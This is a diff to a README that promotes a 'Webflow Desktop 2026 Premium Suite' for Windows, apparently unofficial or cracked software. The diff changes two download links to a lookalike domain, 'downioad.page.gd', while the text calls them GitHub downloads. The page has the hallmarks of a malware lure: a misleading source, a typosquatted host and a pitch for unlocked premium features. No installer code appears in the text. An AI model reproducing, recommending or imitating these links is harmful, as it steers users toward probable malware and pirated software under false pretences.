@@ -2,7 +2,7 @@
 
 Welcome to the Webflow Desktop 2026 Premium Suite, a comprehensive toolkit designed to elevate your web design experience on Windows. This package offers a seamless way to enhance the core functionality of Webflow Desktop, providing access to advanced features and tools that streamline creative workflows for professionals and enthusiasts alike. With a focus on usability and performance, it's tailored for those seeking a robust solution in the 2026 design landscape.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## What's Inside
 
@@ -57,6 +57,6 @@ Updates are periodically released to add new features and improve stability. Che
 
 Get the latest version directly from GitHub to ensure you have all recent enhancements and fixes. Use the following link to start your download:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 This link provides access to the installer and additional resources. Remember to always download from trusted sources to maintain system security. Last Updated: 2026.
